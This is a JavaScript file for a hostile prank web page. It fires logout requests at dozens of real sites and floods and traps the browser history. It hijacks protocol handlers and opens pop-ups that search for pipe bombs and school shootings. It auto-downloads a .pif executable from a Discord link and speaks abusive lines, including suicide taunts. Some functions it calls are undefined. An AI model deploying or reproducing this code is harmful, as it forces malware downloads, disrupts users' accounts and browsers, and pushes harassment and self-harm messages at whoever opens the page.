const FBI_URLS = [
    "https://www.google.com/search?q=how+to+build+a+pipe+bomb",
    "https://www.google.com/search?q=how+to+get+drugs+easliy",
    "https://www.google.com/search?q=porn+free+access",
    "https://www.google.com/search?q=download+porn+games",
    "https://www.google.com/search?q=how+can+i+shoot+up+my+school",
    "https://www.google.com/search?q=how+to+be+racist"
]

const FUNNY = [
    "and give somebody else a piece of that oxygen and ozone layer that's covered up so that we can breathe inside this blue trap bubble",
    "I've never seen somebody so worthless in my life, I dead ass have not seen such a more worthless person in my life",
    "Imagine if somebody like you actually has kids I would feel so sorry for his children because the bitch literally serves no fucking purpose",
    "Imagine a father: now, we got lots of guys with wives and kids and shit that suck my dick daily on the internet, but imagine if this piece of shit actually had children",
    "This guy is devoting the time he could be spending with his kids checking out a black man on stream cucking over him relentlessly! It's crazy! I've never seen somebody so relentless to be seen",
    "Let's go to the 99-cent store let's pick out a rope together",
    "I'm gonna give you an assisted suicide",
    "do you want to play hot anime games online? download the file today."
]

let child_windows = []

function lock_pointer(){
    const requestPointerLockApi = (
        document.body.requestPointerLock ||
        document.body.webkitRequestPointerLock ||
        document.body.mozRequestPointerLock ||
        document.body.msRequestPointerLock
    )
    
    requestPointerLockApi.call(document.body)
}

function vibrate(){
    if(typeof window.navigator.vibrate === 'function'){
        window.navigator.vibrate(90000);
    }
}

function register_proto_handlers(){
    const protocolWhitelist = [
        'bitcoin',
        'geo',
        'im',
        'irc',
        'ircs',
        'magnet',
        'mailto',
        'mms',
        'news',
        'ircs',
        'nntp',
        'sip',
        'sms',
        'smsto',
        'ssh',
        'tel',
        'urn',
        'webcal',
        'wtai',
        'xmpp'
    ]

    const handlerUrl = window.location.href + '/?url=%s'

    protocolWhitelist.forEach(proto => {
      navigator.registerProtocolHandler(proto, handlerUrl, 'Moled')
    })
}

function getRandomArrayEntry (arr) {
    return arr[Math.floor(Math.random() * arr.length)]
  }

function start_audio(){

}

function invoke_webrequests(){

}

function unqueue(){
    vibrate();
    speak(getRandomArrayEntry(FUNNY));
    if (event.which !== 0) search();
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function aids_background(){
    while(true){
        document.querySelector('html').style = "background-color: rgb(" + Math.round(Math.random() * 255) + "," + Math.round(Math.random() * 255) + "," + Math.round(Math.random() * 255) + ");";
        await sleep(250);
    }
}

function speak(phrase) {
    if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
    window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

function download(url_){
    const a = document.createElement('a')
    a.href = url_
    a.download = url_
    a.click()
}

function start_video(video_url){
    const video = document.createElement('video')
    video.src = video_url
    video.loop = true
    video.muted = true
    video.autoplay = true
    video.play()
  
    document.body.appendChild(video)
}

function start_mini_video(video_url){
    const video = document.createElement('video')

    video.src = video_url
    video.autoplay = true
    video.loop = true
    video.style = 'width: 100%; height: 100%;'

    document.body.appendChild(video)
}

function search(){
    if(Math.random() > 0.1){
        open(window.location.pathname + "#c", "_blank", "width=200,height=100");
    }else{
        win = open(getRandomArrayEntry(FBI_URLS), "_blank", "width=50,height=50");
        win.blur();
        window.focus();
    }
}

function ss_fetch(url) {
    const img = document.createElement('img')
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
}

function flood_history() {
    for (let i = 1; i < 100; i++) {
      window.history.pushState({}, '', window.location.pathname + '?q=' + i)
    }

    window.history.pushState({}, '', window.location.pathname)
}

function fullscreen() {
    const requestFullscreen = Element.prototype.requestFullscreen ||
      Element.prototype.webkitRequestFullscreen ||
      Element.prototype.mozRequestFullScreen ||
      Element.prototype.msRequestFullscreen
  
    requestFullscreen.call(document.body)
}

function clipboard_copy(text) {
    // A <span> contains the text to copy
    const span = document.createElement('span')
    span.textContent = text
    span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines
  
    // An <iframe> isolates the <span> from the page's styles
    const iframe = document.createElement('iframe')
    iframe.sandbox = 'allow-same-origin'
    document.body.appendChild(iframe)
  
    let win = iframe.contentWindow
    win.document.body.appendChild(span)
  
    let selection = win.getSelection()
  
    // Firefox fails to get a selection from <iframe> window, so fallback
    if (!selection) {
      win = window
      selection = win.getSelection()
      document.body.appendChild(span)
    }
  
    const range = win.document.createRange()
    selection.removeAllRanges()
    range.selectNode(span)
    selection.addRange(range)
  
    let success = false
    try {
      success = win.document.execCommand('copy')
    } catch (err) {
      console.log(err)
    }
  
    selection.removeAllRanges()
    span.remove()
    iframe.remove()
  
    return success
}


window.addEventListener('popstate', () => {
    window.history.forward();
})

SIGNOUT_URLS = [
    "http://www.amazon.com/gp/flex/sign-out.html?action=sign-out",
    "http://www.blogger.com/logout.g",
    "http://www.delicious.com/logout",
    "https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout",
    "https://www.dropbox.com/logout",
    "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn",
    "https://www.gandi.net/login/out",
    "https://github.com/logout",
    "http://mail.google.com/mail/?logout",
    "https://www.google.com/accounts/Logout",
    "https://secure.hulu.com/logout",
    "http://www.instapaper.com/user/logout",
    "https://manager.linode.com/session/logout",
    "http://www.myspace.com/index.cfm?fuseaction=signout",
    "http://www.netflix.com/Logout",
    "http://www.nytimes.com/logout",
    "https://secure.newegg.com/NewMyAccount/AccountLogout.aspx",
    "http://photobucket.com/logout",
    "https://secure.skype.com/account/logout",
    "http://slashdot.org/my/logout",
    "http://soundcloud.com/logout",
    "http://steamcommunity.com/?action=doLogout",
    "http://store.steampowered.com/logout/",
    "https://www.thinkgeek.com/brain/account/login.cgi?a=lo",
    "http://www.threadless.com/logout",
    "http://www.tumblr.com/logout",
    "http://vimeo.com/log_out",
    "http://en.wikipedia.org/w/index.php?title=Special:UserLogout",
    "http://login.live.com/logout.srf",
    "https://wordpress.com/wp-login.php?action=logout",
    "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
]

async function jump_around(){
    while(true){
        window.moveTo(Math.random() * screen.width, Math.random() * screen.height);
        await sleep(50);
        window.focus();
    }
}

window.onbeforeunload = function() { return "no bitch"; }

async function random_shit(){
    while(true){
        document.getElementById('stuff').innerHTML = getRandomArrayEntry(FUNNY);
        await sleep(500);
    }
}

if(window.location.hash){
    download("https://cdn.discordapp.com/attachments/985083539072643072/985367259436437514/image.pif");
    start_video("https://media.discordapp.net/attachments/982426407944720425/982497148170014740/SPOILER_VID_88110923_132925_555-1_1.mp4");
    jump_around();
    aids_background();
    random_shit();
    lock_pointer();
    document.body.addEventListener('keydown', unqueue);
    document.body.addEventListener('keyup', unqueue);
    document.body.addEventListener('keypress', unqueue);
    document.body.addEventListener('mouseup', (e) => {
        unqueue();
    });
}else{
    document.getElementById('stuff').innerHTML = "PRESS THE SPACE KEY TO LOAD THE PAGE";
    document.body.addEventListener('mouseup', (e) => {
        unqueue();
    });
    document.body.addEventListener('keydown', unqueue);
    document.body.addEventListener('keyup', unqueue);
    document.body.addEventListener('keypress', unqueue);
    speak(getRandomArrayEntry(FUNNY));
    register_proto_handlers();
    flood_history();
    window.setTimeout(() => {
        aids_background();
    }, 7000);
    for(let url of SIGNOUT_URLS){
        ss_get(url);
    }
}
